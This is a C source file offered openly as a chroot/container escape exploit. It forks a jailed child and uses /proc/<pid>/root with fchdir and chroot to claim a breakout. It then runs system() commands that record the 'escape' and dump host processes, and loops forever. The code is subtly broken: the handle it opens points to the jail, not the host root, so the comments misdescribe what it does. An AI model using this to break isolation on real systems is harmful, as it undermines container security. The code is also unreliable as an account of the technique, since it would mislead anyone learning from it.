// File: chroot-escape-src/chroot_escape.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sched.h>
#include <fcntl.h>

#define HOST_ROOT "/host"
#define JAIL_DIR "/host/tmp/jail"

int main() {
    printf("[chroot_escape] Starting chroot escape...\n");

    // 1. Prepare the jail directory on the host filesystem.
    mkdir(JAIL_DIR, 0755);

    // 2. Fork the process. The child will enter the jail.
    pid_t pid = fork();
    if (pid == -1) {
        perror("[-] fork failed");
        return 1;
    }

    if (pid == 0) { // --- CHILD PROCESS ---
        // Chroot into the jail directory. This process is now trapped.
        if (chroot(JAIL_DIR) != 0) {
            perror("[-] Child chroot failed");
            exit(1);
        }
        // Keep the child alive so the parent can exploit it.
        sleep(10);
        exit(0);
    } else { // --- PARENT PROCESS ---
        // Give the child a moment to enter the chroot.
        sleep(1);
        printf("[+] Child process with PID %d is now jailed.\n", pid);

        // 3. Find the child's root via the /proc filesystem.
        char proc_root_path[256];
        snprintf(proc_root_path, sizeof(proc_root_path), "/proc/%d/root", pid);

        // 4. Open a file descriptor to the child's root. This is our handle to the host.
        int fd = open(proc_root_path, O_RDONLY);
        if (fd == -1) {
            perror("[-] Could not open child's proc root");
            return 1;
        }
        printf("[+] Opened file descriptor to host root.\n");

        // 5. Use fchdir to change our directory to the host root, then chroot.
        // This is the core of the escape.
        if (fchdir(fd) != 0) {
            perror("[-] fchdir failed");
            close(fd);
            return 1;
        }

        if (chroot(".") != 0) {
            perror("[-] Parent chroot escape failed");
            close(fd);
            return 1;
        }
        close(fd);

        // 6. We are now on the host! Execute a command to prove it.
        printf("[+] ESCAPE SUCCESSFUL! Executing command on the host...\n");
        system("echo 'Container escape via double chroot successful at $(date)' > /tmp/CHROOT_ESCAPE_SUCCESSFUL");
        system("ps aux > /tmp/HOST_PROCESSES_FROM_CHROOT.txt");

        // Loop forever to keep the shell "on the host" for potential inspection.
        while(1) { sleep(1); }
    }

    return 0;
}